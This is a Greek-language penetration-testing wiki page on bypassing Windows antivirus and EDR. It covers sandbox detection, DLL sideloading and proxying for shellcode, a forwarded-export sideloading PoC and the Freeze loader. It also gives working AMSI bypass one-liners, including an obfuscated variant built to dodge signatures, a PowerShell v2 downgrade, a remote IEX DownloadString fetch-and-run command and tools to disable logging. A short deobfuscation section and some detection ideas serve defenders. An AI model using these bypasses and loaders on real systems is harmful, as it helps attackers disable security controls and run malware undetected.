# Παράκαμψη Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Αυτή η σελίδα γράφτηκε από** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Διακοπή Defender

- [defendnot](https://github.com/es3n1n/defendnot): Ένα εργαλείο για να απενεργοποιήσει το Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Ένα εργαλείο για να σταματήσει το Windows Defender λειτουργώντας προσποιούμενο έναν άλλο AV.
- [Απενεργοποίηση Defender αν είστε admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Προς το παρόν, τα AVs χρησιμοποιούν διαφορετικές μεθόδους για να ελέγξουν αν ένα αρχείο είναι κακόβουλο ή όχι: static detection, dynamic analysis, και για τα πιο προηγμένα EDRs, behavioural analysis.

### **Static detection**

Το static detection επιτυγχάνεται σηματοδοτώντας γνωστές κακόβουλες συμβολοσειρές ή πίνακες bytes σε ένα binary ή script, και επίσης εξάγοντας πληροφορίες από το ίδιο το αρχείο (π.χ. file description, company name, digital signatures, icon, checksum, κ.λπ.). Αυτό σημαίνει ότι η χρήση γνωστών δημόσιων εργαλείων μπορεί να σε αποκαλύψει πιο εύκολα, καθώς μάλλον έχουν ήδη αναλυθεί και επισημανθεί ως κακόβουλα. Υπάρχουν μερικοί τρόποι να αποφύγετε αυτόν τον τύπο detection:

- **Encryption**

  Εάν κρυπτογραφήσετε το binary, δεν θα υπάρχει τρόπος για τα AV να εντοπίσουν το πρόγραμμά σας, αλλά θα χρειαστείτε κάποιο είδος loader για να αποκρυπτογραφήσετε και να τρέξετε το πρόγραμμα στη μνήμη.

- **Obfuscation**

  Μερικές φορές το μόνο που χρειάζεται είναι να αλλάξετε κάποιες strings στο binary ή script για να περάσει από AV, αλλά αυτό μπορεί να είναι χρονοβόρο ανάλογα με το τι προσπαθείτε να obfuscate.

- **Custom tooling**

  Αν αναπτύξετε τα δικά σας εργαλεία, δεν θα υπάρχουν γνωστές κακές signatures, αλλά αυτό απαιτεί πολύ χρόνο και κόπο.

> [!TIP]
> Ένας καλός τρόπος για να ελέγξετε το Windows Defender static detection είναι το [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Βασικά διαχωρίζει το αρχείο σε πολλαπλά τμήματα και ζητά από τον Defender να σαρώσει καθένα ξεχωριστά, έτσι μπορεί να σας πει ακριβώς ποιες συμβολοσειρές ή bytes σημαδεύονται στο binary σας.

Σας συστήνω ανεπιφύλακτα να δείτε αυτό το [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) για πρακτική AV Evasion.

### **Dynamic analysis**

Dynamic analysis είναι όταν τα AV τρέχουν το binary σας σε ένα sandbox και παρακολουθούν για κακόβουλη δραστηριότητα (π.χ. προσπάθεια αποκρυπτογράφησης και ανάγνωσης των κωδικών του browser σας, εκτέλεση minidump σε LSASS, κ.λπ.). Αυτό το μέρος μπορεί να είναι λίγο πιο δύσκολο, αλλά εδώ είναι μερικά πράγματα που μπορείτε να κάνετε για να αποφύγετε sandboxes.

- **Sleep before execution** Ανάλογα με το πώς υλοποιείται, μπορεί να είναι καλός τρόπος για να παρακάμψετε το dynamic analysis των AV. Τα AV έχουν πολύ σύντομο χρόνο για να σαρώσουν αρχεία ώστε να μην διακόψουν τη ροή εργασίας του χρήστη, οπότε η χρήση μεγάλων sleep μπορεί να διαταράξει την ανάλυση των binaries. Το πρόβλημα είναι ότι πολλά sandboxes των AV μπορούν απλώς να παρακάμψουν το sleep ανάλογα με την υλοποίηση.
- **Checking machine's resources** Συνήθως τα Sandboxes έχουν πολύ λίγους πόρους (π.χ. < 2GB RAM), αλλιώς θα μπορούσαν να επιβραδύνουν το μηχάνημα του χρήστη. Μπορείτε επίσης να γίνετε πολύ δημιουργικοί εδώ, για παράδειγμα ελέγχοντας τη θερμοκρασία της CPU ή ακόμα και τις στροφές του ανεμιστήρα — δεν θα είναι όλα υλοποιημένα στο sandbox.
- **Machine-specific checks** Αν θέλετε να στοχεύσετε έναν χρήστη του οποίου ο workstation είναι ενωμένος στο domain "contoso.local", μπορείτε να ελέγξετε το domain του υπολογιστή για να δείτε αν ταιριάζει με αυτό που έχετε καθορίσει — αν όχι, μπορείτε να κάνετε το πρόγραμμα σας να τερματίσει.

Αποδεικνύεται ότι το computername του Microsoft Defender's Sandbox είναι HAL9TH, οπότε μπορείτε να ελέγξετε το όνομα του υπολογιστή στο malware σας πριν την detonation — αν το όνομα ταιριάζει με HAL9TH, σημαίνει ότι βρίσκεστε μέσα στο sandbox του Defender, οπότε μπορείτε να κάνετε το πρόγραμμα σας να τερματίσει.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>πηγή: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Μερικές ακόμα πολύ καλές συμβουλές από [@mgeeky](https://twitter.com/mariuszbit) για αντιμετώπιση των Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev κανάλι</p></figcaption></figure>

Όπως είπαμε νωρίτερα σε αυτή την ανάρτηση, **τα public tools** τελικά θα **εντοπιστούν**, οπότε θα πρέπει να αναρωτηθείτε το εξής:

Για παράδειγμα, αν θέλετε να dumpάρετε το LSASS, **χρειάζεται πραγματικά να χρησιμοποιήσετε το mimikatz**; Ή θα μπορούσατε να χρησιμοποιήσετε ένα διαφορετικό project που είναι λιγότερο γνωστό και επίσης κάνει dump το LSASS.

Η σωστή απάντηση είναι πιθανότατα το δεύτερο. Παίρνοντας το mimikatz ως παράδειγμα, είναι πιθανώς ένα από τα, αν όχι το περισσότερο επισημασμένα κομμάτια malware από AVs και EDRs — ενώ το project καθαυτό είναι πολύ καλό, είναι επίσης εφιάλτης να δουλεύεις με αυτό για να παρακάμψεις τα AVs, οπότε απλά ψάξτε εναλλακτικές για αυτό που προσπαθείτε να πετύχετε.

> [!TIP]
> Όταν τροποποιείτε τα payloads σας για evasion, βεβαιωθείτε ότι έχετε **απενεργοποιήσει την αυτόματη υποβολή δειγμάτων** στον Defender, και παρακαλώ, σοβαρά, **ΜΗΝ ΑΝΕΒΑΣΕΤΕ ΣΕ VIRUSTOTAL** αν ο στόχος σας είναι η επίτευξη evasion μακροπρόθεσμα. Αν θέλετε να ελέγξετε αν το payload σας εντοπίζεται από κάποιο συγκεκριμένο AV, εγκαταστήστε το σε ένα VM, προσπαθήστε να απενεργοποιήσετε την αυτόματη υποβολή δειγμάτων, και δοκιμάστε εκεί μέχρι να είστε ικανοποιημένοι με το αποτέλεσμα.

## EXEs vs DLLs

Όποτε είναι δυνατόν, πάντα **προτεραιοποιήστε τη χρήση DLLs για evasion**, κατά την εμπειρία μου, τα DLL αρχεία συνήθως **εντοπίζονται πολύ λιγότερο** και αναλύονται λιγότερο, οπότε είναι ένα πολύ απλό κόλπο για να αποφύγετε τον εντοπισμό σε κάποιες περιπτώσεις (αν το payload σας έχει τρόπο να τρέξει ως DLL φυσικά).

Όπως βλέπουμε σε αυτή την εικόνα, ένα DLL Payload από το Havoc έχει ποσοστό ανίχνευσης 4/26 στο antiscan.me, ενώ το EXE payload έχει ποσοστό ανίχνευσης 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>Σύγκριση στο antiscan.me μεταξύ ενός κανονικού Havoc EXE payload και ενός κανονικού Havoc DLL</p></figcaption></figure>

Τώρα θα δείξουμε μερικά κόλπα που μπορείτε να χρησιμοποιήσετε με DLL αρχεία για να γίνετε πολύ πιο δύσκολα ανιχνεύσιμοι.

## DLL Sideloading & Proxying

**DLL Sideloading** εκμεταλλεύεται τη DLL search order που χρησιμοποιεί ο loader τοποθετώντας την victim application και τα malicious payload(s) δίπλα-δίπλα.

Μπορείτε να ελέγξετε για προγράμματα ευάλωτα σε DLL Sideloading χρησιμοποιώντας [Siofra](https://github.com/Cybereason/siofra) και το παρακάτω powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Αυτή η εντολή θα εμφανίσει τη λίστα προγραμμάτων ευάλωτων σε DLL hijacking μέσα στο "C:\Program Files\\" και τα DLL αρχεία που προσπαθούν να φορτώσουν.

Συστήνω ανεπιφύλακτα να **explore DLL Hijackable/Sideloadable programs yourself**, αυτή η τεχνική είναι αρκετά stealthy όταν εκτελείται σωστά, αλλά αν χρησιμοποιήσετε δημόσια γνωστά DLL Sideloadable προγράμματα, μπορεί να σας πιάσουν εύκολα.

Απλώς τοποθετώντας ένα κακόβουλο DLL με το όνομα που ένα πρόγραμμα αναμένει να φορτώσει, δεν θα φορτώσει απαραίτητα το payload σας, καθώς το πρόγραμμα περιμένει συγκεκριμένες συναρτήσεις μέσα σε εκείνο το DLL. Για να διορθώσουμε αυτό το θέμα, θα χρησιμοποιήσουμε μια άλλη τεχνική που ονομάζεται **DLL Proxying/Forwarding**.

Το **DLL Proxying** προωθεί τις κλήσεις που κάνει ένα πρόγραμμα από το proxy (και κακόβουλο) DLL στο αρχικό DLL, διατηρώντας έτσι τη λειτουργικότητα του προγράμματος και επιτρέποντας την εκτέλεση του payload σας.

Θα χρησιμοποιήσω το project [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) από τον [@flangvik](https://twitter.com/Flangvik/)

Αυτά είναι τα βήματα που ακολούθησα:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Η τελευταία εντολή θα μας δώσει 2 αρχεία: ένα πρότυπο πηγαίου κώδικα DLL και το αρχικό μετονομασμένο DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Τόσο το shellcode μας (κωδικοποιημένο με [SGN](https://github.com/EgeBalci/sgn)) όσο και το proxy DLL έχουν ποσοστό ανίχνευσης 0/26 στο [antiscan.me](https://antiscan.me)! Θα το χαρακτήριζα επιτυχία.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Σας συνιστώ **έντονα** να παρακολουθήσετε [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) για το DLL Sideloading και επίσης [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) για να μάθετε περισσότερα για όσα συζητήσαμε σε μεγαλύτερο βάθος.

### Κατάχρηση Forwarded Exports (ForwardSideLoading)

Τα Windows PE modules μπορούν να export functions που στην πραγματικότητα είναι "forwarders": αντί να δείχνουν σε κώδικα, η export entry περιέχει ένα ASCII string της μορφής `TargetDll.TargetFunc`. Όταν ένας caller επιλύει την export, ο Windows loader θα:

- Load `TargetDll` if not already loaded
- Resolve `TargetFunc` from it

Βασικές συμπεριφορές που πρέπει να κατανοηθούν:
- Αν το `TargetDll` είναι KnownDLL, παρέχεται από τον προστατευμένο KnownDLLs namespace (π.χ., ntdll, kernelbase, ole32).
- Αν το `TargetDll` δεν είναι KnownDLL, χρησιμοποιείται η κανονική DLL search order, που περιλαμβάνει τον κατάλογο του module που κάνει την forward resolution.

Αυτό επιτρέπει ένα έμμεσο sideloading primitive: βρείτε ένα signed DLL που εξάγει μια function η οποία forwarded σε ένα non-KnownDLL module name, και στη συνέχεια τοποθετήστε αυτό το signed DLL μαζί με ένα attacker-controlled DLL με ακριβώς το ίδιο όνομα όπως το forwarded target module. Όταν η forwarded export κληθεί, ο loader επιλύει το forward και φορτώνει το DLL σας από τον ίδιο κατάλογο, εκτελώντας το DllMain σας.

Παράδειγμα παρατηρημένο στα Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` δεν είναι KnownDLL, οπότε επιλύεται με την κανονική σειρά αναζήτησης.

PoC (copy-paste):
1) Αντιγράψτε το υπογεγραμμένο system DLL σε έναν εγγράψιμο φάκελο
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Τοποθετήστε ένα κακόβουλο `NCRYPTPROV.dll` στον ίδιο φάκελο. Ένα ελάχιστο `DllMain` αρκεί για την εκτέλεση κώδικα; δεν χρειάζεται να υλοποιήσετε την forwarded function για να ενεργοποιηθεί το `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Προκαλέστε την προώθηση με ένα υπογεγραμμένο LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Παρατηρούμενη συμπεριφορά:
- rundll32 (υπογεγραμμένο) φορτώνει το side-by-side `keyiso.dll` (υπογεγραμμένο)
- Κατά την επίλυση του `KeyIsoSetAuditingInterface`, ο loader ακολουθεί το forward προς το `NCRYPTPROV.SetAuditingInterface`
- Στη συνέχεια ο loader φορτώνει το `NCRYPTPROV.dll` από `C:\test` και εκτελεί το `DllMain`
- Εάν το `SetAuditingInterface` δεν έχει υλοποιηθεί, θα λάβετε σφάλμα "missing API" μόνο αφού το `DllMain` έχει ήδη εκτελεστεί

Συμβουλές εντοπισμού:
- Επικεντρωθείτε σε forwarded exports όπου το target module δεν είναι KnownDLL. Τα KnownDLLs αναγράφονται στο `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Μπορείτε να απαριθμήσετε τα forwarded exports με εργαλεία όπως:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Δείτε το Windows 11 forwarder inventory για να αναζητήσετε υποψήφιους: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Παρακολουθήστε τα LOLBins (π.χ., rundll32.exe) που φορτώνουν signed DLLs από non-system paths, και στη συνέχεια φορτώνουν non-KnownDLLs με το ίδιο base name από εκείνον τον κατάλογο
- Ειδοποιήστε για process/module chains όπως: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` κάτω από user-writable paths
- Εφαρμόστε πολιτικές code integrity (WDAC/AppLocker) και απαγορεύστε write+execute σε application directories

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze είναι ένα payload toolkit για bypassing EDRs χρησιμοποιώντας suspended processes, direct syscalls, και alternative execution methods`

Μπορείτε να χρησιμοποιήσετε το Freeze για να φορτώσετε και να εκτελέσετε το shellcode σας με stealthy τρόπο.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Η αποφυγή ανίχνευσης είναι ένα παιχνίδι γάτας και ποντικού — αυτό που λειτουργεί σήμερα μπορεί να εντοπιστεί αύριο, οπότε μην βασίζεστε σε ένα μόνο εργαλείο. Αν είναι δυνατόν, προσπαθήστε να συνδυάσετε πολλαπλές τεχνικές αποφυγής.

## AMSI (Anti-Malware Scan Interface)

AMSI was created to prevent "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Αρχικά, οι AVs μπορούσαν μόνο να σαρώσουν **αρχεία στο δίσκο**, οπότε αν κατά κάποιο τρόπο εκτελούσατε payloads **απευθείας στη μνήμη**, ο AV δεν μπορούσε να κάνει τίποτα για να το αποτρέψει, καθώς δεν είχε επαρκή ορατότητα.

Η δυνατότητα AMSI ενσωματώνεται σε αυτά τα στοιχεία των Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Επιτρέπει στις λύσεις antivirus να εξετάζουν τη συμπεριφορά των scripts εκθέτοντας τα περιεχόμενα των scripts σε μορφή που είναι μη κρυπτογραφημένη και χωρίς obfuscation.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Παρατηρήστε πώς προσθέτει ως πρόθεμα `amsi:` και στη συνέχεια το μονοπάτι προς το εκτελέσιμο από το οποίο εκτελέστηκε το script, στη συγκεκριμένη περίπτωση, powershell.exe

Δεν αποθέσαμε κανένα αρχείο στο δίσκο, αλλά παρ' όλα αυτά πιαστήκαμε στη μνήμη λόγω του AMSI.

Επιπλέον, από την **.NET 4.8**, ο κώδικας C# εκτελείται μέσω AMSI επίσης. Αυτό επηρεάζει ακόμη και το `Assembly.Load(byte[])` για φόρτωση/εκτέλεση στη μνήμη. Γι' αυτό συνιστάται η χρήση χαμηλότερων εκδόσεων του .NET (π.χ. 4.7.2 ή κάτω) για in-memory execution αν θέλετε να αποφύγετε το AMSI.

Υπάρχουν μερικοί τρόποι για να παρακάμψετε το AMSI:

- **Obfuscation**

Εφόσον το AMSI λειτουργεί κυρίως με στατικές ανιχνεύσεις, η τροποποίηση των scripts που προσπαθείτε να φορτώσετε μπορεί να είναι ένας καλός τρόπος για την αποφυγή ανίχνευσης.

Ωστόσο, το AMSI έχει τη δυνατότητα να αφαιρεί την obfuscation από scripts ακόμη και αν έχουν πολλαπλά επίπεδα, οπότε η obfuscation μπορεί να είναι κακή επιλογή ανάλογα με τον τρόπο που γίνεται. Αυτό καθιστά την παράκαμψη όχι και τόσο απλή. Παρ' όλα αυτά, μερικές φορές αρκεί να αλλάξετε μερικά ονόματα μεταβλητών και θα είστε εντάξει, οπότε εξαρτάται από το πόσο πολύ έχει επισημανθεί κάτι.

- **AMSI Bypass**

Εφόσον το AMSI υλοποιείται με το φόρτωμα ενός DLL στη διαδικασία του powershell (επίσης cscript.exe, wscript.exe, κ.λπ.), είναι δυνατόν να το αλλοιώσετε εύκολα ακόμη και όταν τρέχετε ως μη προνομιούχος χρήστης. Λόγω αυτής της ατέλειας στην υλοποίηση του AMSI, ερευνητές έχουν βρει πολλούς τρόπους να αποφύγουν το AMSI scanning.

**Forcing an Error**

Το να προκαλέσετε αποτυχία στην αρχικοποίηση του AMSI (amsiInitFailed) θα έχει ως αποτέλεσμα να μην ξεκινήσει καμία σάρωση για τη τρέχουσα διαδικασία. Αρχικά αυτό αποκαλύφθηκε από [Matt Graeber](https://twitter.com/mattifestation) και η Microsoft έχει αναπτύξει μια signature για να αποτρέψει την ευρύτερη χρήση.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Αρκούσε μία μόνο γραμμή κώδικα powershell για να καταστήσει το AMSI μη λειτουργικό για την τρέχουσα διεργασία powershell. Αυτή η γραμμή, φυσικά, έχει επισημανθεί από το AMSI, οπότε χρειάζεται κάποια τροποποίηση για να χρησιμοποιηθεί αυτή η τεχνική.

Εδώ είναι ένα τροποποιημένο AMSI bypass που πήρα από αυτό το [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Λάβετε υπόψη ότι αυτό πιθανότατα θα επισημανθεί όταν αυτή η ανάρτηση δημοσιευτεί, οπότε δεν πρέπει να δημοσιεύσετε κανέναν κώδικα αν το σχέδιό σας είναι να παραμείνετε απαρατήρητοι.

**Memory Patching**

Η τεχνική αυτή ανακαλύφθηκε αρχικά από [@RastaMouse](https://twitter.com/_RastaMouse/) και περιλαμβάνει τον εντοπισμό της διεύθυνσης της συνάρτησης "AmsiScanBuffer" στο amsi.dll (υπεύθυνη για τη σάρωση του περιεχομένου που παρέχει ο χρήστης) και την αντικατάστασή της με εντολές που επιστρέφουν τον κώδικα E_INVALIDARG. Με αυτόν τον τρόπο, το αποτέλεσμα της πραγματικής σάρωσης θα επιστρέψει 0, που ερμηνεύεται ως καθαρό αποτέλεσμα.

> [!TIP]
> Παρακαλώ διαβάστε [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) για μια πιο λεπτομερή εξήγηση.

Υπάρχουν επίσης πολλές άλλες τεχνικές που χρησιμοποιούνται για να παρακάμψουν το AMSI με powershell, ρίξτε μια ματιά σε [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) και [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) για να μάθετε περισσότερα γι' αυτές.

Αυτό το εργαλείο [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) επίσης δημιουργεί script για να παρακάμψει το AMSI.

**Αφαίρεση του εντοπισμένου signature**

Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** και **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** για να αφαιρέσετε την εντοπισμένη AMSI signature από τη μνήμη της τρέχουσας διεργασίας. Το εργαλείο αυτό λειτουργεί σαρώνοντας τη μνήμη της τρέχουσας διεργασίας για την AMSI signature και στη συνέχεια την αντικαθιστά με εντολές NOP, αφαιρώντας την ουσιαστικά από τη μνήμη.

**AV/EDR προϊόντα που χρησιμοποιούν AMSI**

Μπορείτε να βρείτε μια λίστα με AV/EDR προϊόντα που χρησιμοποιούν AMSI στο **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Χρησιμοποιήστε Powershell version 2**
Αν χρησιμοποιήσετε PowerShell version 2, το AMSI δεν θα φορτωθεί, οπότε μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να κάνετε το εξής:
```bash
powershell.exe -version 2
```
## PS Καταγραφή

Η καταγραφή του PowerShell είναι μια λειτουργία που σας επιτρέπει να καταγράφετε όλες τις εντολές PowerShell που εκτελούνται σε ένα σύστημα. Αυτό μπορεί να είναι χρήσιμο για σκοπούς ελέγχου και αντιμετώπισης προβλημάτων, αλλά μπορεί επίσης να αποτελεί **πρόβλημα για επιτιθέμενους που θέλουν να αποφύγουν την ανίχνευση**.

Για να παρακάμψετε την καταγραφή του PowerShell, μπορείτε να χρησιμοποιήσετε τις παρακάτω τεχνικές:

- **Disable PowerShell Transcription and Module Logging**: Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) για αυτόν τον σκοπό.
- **Use Powershell version 2**: Εάν χρησιμοποιήσετε PowerShell version 2, το AMSI δεν θα φορτωθεί, οπότε μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε έτσι: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Χρησιμοποιήστε [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) για να δημιουργήσετε μια PowerShell χωρίς άμυνες (αυτό είναι που χρησιμοποιεί το `powerpick` από Cobalt Strike).


## Απόκρυψη

> [!TIP]
> Πολλές τεχνικές απόκρυψης βασίζονται στην κρυπτογράφηση δεδομένων, η οποία θα αυξήσει την εντροπία του δυαδικού αρχείου και θα διευκολύνει τα AVs και EDRs να το εντοπίσουν. Να είστε προσεκτικοί με αυτό και ίσως εφαρμόζετε κρυπτογράφηση μόνο σε συγκεκριμένα τμήματα του κώδικα που είναι ευαίσθητα ή πρέπει να κρυφτούν.

### Αποκωδικοποίηση .NET δυαδικών προστατευμένων με ConfuserEx

Όταν αναλύετε malware που χρησιμοποιεί ConfuserEx 2 (ή εμπορικά forks) είναι συνηθισμένο να αντιμετωπίζετε πολλαπλά επίπεδα προστασίας που θα μπλοκάρουν decompilers και sandboxes. Η παρακάτω ροή εργασίας επαναφέρει αξιόπιστα ένα σχεδόν αρχικό IL που μπορεί στη συνέχεια να απομεταγλωττιστεί σε C# με εργαλεία όπως dnSpy ή ILSpy.

1.  Anti-tampering removal – ConfuserEx κρυπτογραφεί κάθε *method body* και το αποκρυπτογραφεί μέσα στον static constructor του *module* (`<Module>.cctor`). Αυτό επίσης τροποποιεί το PE checksum οπότε οποιαδήποτε αλλαγή θα καταρρεύσει το δυαδικό. Χρησιμοποιήστε **AntiTamperKiller** για να εντοπίσετε τους κρυπτογραφημένους πίνακες metadata, να ανακτήσετε τα XOR κλειδιά και να ξαναγράψετε ένα καθαρό assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Η έξοδος περιέχει τις 6 παραμέτρους anti-tamper (`key0-key3`, `nameHash`, `internKey`) που μπορούν να είναι χρήσιμες όταν φτιάχνετε τον δικό σας unpacker.

2.  Symbol / control-flow recovery – τροφοδοτήστε το *clean* αρχείο στο **de4dot-cex** (ένα ConfuserEx-aware fork του de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – επιλέγει το προφίλ ConfuserEx 2  
• de4dot θα αναιρέσει το control-flow flattening, θα αποκαταστήσει τα αρχικά namespaces, κλάσεις και ονόματα μεταβλητών και θα αποκρυπτογραφήσει τις σταθερές συμβολοσειρές.

3.  Proxy-call stripping – το ConfuserEx αντικαθιστά τις άμεσες κλήσεις με ελαφριά wrappers (γνωστά και ως *proxy calls*) για να δυσκολέψει περαιτέρω την αποσυμπίληση. Αφαιρέστε τα με **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Μετά από αυτό το βήμα θα πρέπει να παρατηρείτε κανονικές .NET API όπως `Convert.FromBase64String` ή `AES.Create()` αντί για αδιαφανείς wrapper συναρτήσεις (`Class8.smethod_10`, …).

4.  Χειροκίνητο καθάρισμα – τρέξτε το προκύπτον binary στο dnSpy, αναζητήστε μεγάλα Base64 blobs ή χρήση `RijndaelManaged`/`TripleDESCryptoServiceProvider` για να εντοπίσετε το *πραγματικό* payload. Συχνά το malware το αποθηκεύει ως TLV-encoded πίνακα bytes αρχικοποιημένο μέσα στο `<Module>.byte_0`.

Η παραπάνω αλυσίδα επαναφέρει τη ροή εκτέλεσης **χωρίς** να χρειαστεί να τρέξετε το κακόβουλο δείγμα – χρήσιμο όταν εργάζεστε σε offline workstation.

> 🛈  Το ConfuserEx παράγει ένα custom attribute με όνομα `ConfusedByAttribute` που μπορεί να χρησιμοποιηθεί ως IOC για αυτόματη ταξινόμηση δειγμάτων.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Στόχος αυτού του project είναι να παρέχει ένα open-source fork της [LLVM](http://www.llvm.org/) compilation suite ικανό να προσφέρει αυξημένη ασφάλεια λογισμικού μέσω [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) και tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): Το ADVobfuscator δείχνει πώς να χρησιμοποιήσετε τη γλώσσα `C++11/14` για να δημιουργήσετε, κατά τον χρόνο μεταγλώττισης, obfuscated code χωρίς να χρησιμοποιήσετε κανένα εξωτερικό εργαλείο και χωρίς να τροποποιήσετε τον compiler.
- [**obfy**](https://github.com/fritzone/obfy): Προσθέτει ένα επίπεδο obfuscated operations που παράγεται από το C++ template metaprogramming framework, το οποίο θα κάνει τη ζωή αυτού που θέλει να crack-άρει την εφαρμογή λίγο πιο δύσκολη.
